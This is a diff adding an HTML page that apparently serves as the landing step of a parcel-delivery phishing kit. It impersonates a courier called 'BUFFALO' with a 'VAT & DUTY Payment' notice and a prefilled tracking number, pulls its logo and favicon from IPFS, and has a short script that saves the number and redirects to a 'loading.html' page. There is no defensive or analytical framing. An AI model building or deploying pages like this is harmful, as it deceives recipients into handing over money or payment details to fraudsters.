@@ -1,0 +1,187 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>VAT & DUTY Payment</title>
+<link rel="icon" href="https://ipfs.io/ipfs/bafkreigr3lfqslffgr7rp35wxddzcvd7bbhzisacqc54ol2spqgmlkqb54">
+<style>
+  :root{
+    --max-width:800px;
+    --muted:#666;
+    --accent:#000;
+    --container-padding:40px;
+    --bg:#ffffff;
+  }
+
+  html,body{
+    height:100%;
+    margin:0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    background:var(--bg);
+    color:var(--accent);
+  }
+
+  .page {
+    min-height:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    box-sizing:border-box;
+  }
+
+  .card {
+    width:100%;
+    max-width:var(--max-width);
+    display:grid;
+    grid-template-columns: 1fr 220px;
+    gap:20px;
+    align-items:start;
+    box-sizing:border-box;
+    padding: var(--container-padding);
+    border:1px solid #ddd;
+    border-radius:8px;
+    background:#fff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+  }
+
+  .left {
+    display:flex;
+    flex-direction:column;
+  }
+
+  h1 { 
+    margin:0 0 16px 0; 
+    font-size:32px; 
+    font-weight:600; 
+    letter-spacing:0.2px; 
+  }
+
+  .greeting { 
+    margin:0 0 18px 0; 
+    color:var(--muted); 
+    font-size:15px; 
+  }
+
+  .message { 
+    color:var(--muted); 
+    font-size:13px; 
+    line-height:1.6; 
+    max-width:100%;
+  }
+
+  .tracking-row { 
+    margin-top:24px; 
+    display:flex; 
+    gap:8px; 
+    align-items:center; 
+    font-size:14px; 
+    flex-wrap:wrap;
+  }
+
+  label { 
+    white-space:nowrap; 
+    color:var(--muted); 
+  }
+
+  input[type="text"]{ 
+    padding:6px 8px; 
+    height:34px; 
+    border:1px solid #cfcfcf; 
+    border-radius:3px; 
+    font-family:monospace; 
+    flex:1 1 auto;
+    min-width:120px;
+  }
+
+  button { 
+    height:34px; 
+    padding:0 12px; 
+    border:1px solid #b6b6b6; 
+    background:#f5f5f5; 
+    border-radius:3px; 
+    cursor:pointer; 
+    font-size:13px; 
+    flex-shrink:0;
+  }
+
+  button:active{ 
+    transform:translateY(1px); 
+  }
+
+  .right { 
+    display:flex; 
+    align-items:center; 
+    justify-content:flex-end; 
+  }
+
+  .right img {
+    max-width:100%;
+    height:auto;
+  }
+
+  @media (max-width:720px){
+    .card { 
+      grid-template-columns: 1fr; 
+      text-align:center; 
+      padding:20px; 
+    }
+
+    .right { 
+      justify-content:center; 
+      margin-top:20px; 
+    }
+
+    h1 { font-size:26px; }
+    .tracking-row { justify-content:center; gap:6px; }
+    input[type="text"]{ min-width:80px; width:60%; }
+  }
+</style>
+</head>
+<body>
+  <div class="page">
+    <div class="card" role="main" aria-labelledby="page-title">
+      <div class="left">
+        <h1 id="page-title">VAT &amp; DUTY Payment</h1>
+
+        <p class="greeting">Dear BUFFALO customer,</p>
+
+        <p class="message">
+          In order to ensure the security of your information, please make sure your tracking number in the box is correct.
+        </p>
+
+        <div class="tracking-row" aria-label="Tracking">
+          <label for="tracking">Tracking Number:</label>
+          <input id="tracking" type="text" value="BUFZA606156YQ" aria-label="Tracking number" />
+          <button id="trackBtn" type="button">Track Now</button>
+        </div>
+      </div>
+
+      <div class="right" aria-hidden="false">
+          <img src="https://ipfs.io/ipfs/bafkreift76igpyooavjbhnueqp2pdn5a3q3iczjmp5smq6d2vdxqc2uxsq" 
+               alt="BUFFALO Logo">
+      </div>
+    </div>
+  </div>
+
+<script>
+  const btn = document.getElementById('trackBtn');
+  const input = document.getElementById('tracking');
+
+  btn.addEventListener('click', function(){
+    const tn = input.value.trim();
+    if(!tn){
+      alert('Please enter a tracking number.');
+      return;
+    }
+    localStorage.setItem('partCode', tn);
+    window.location.href = "loading.html";
+  });
+
+  input.addEventListener('keydown', function(e){
+    if(e.key === 'Enter'){ btn.click(); }
+  });
+</script>
+</body>
+</html>
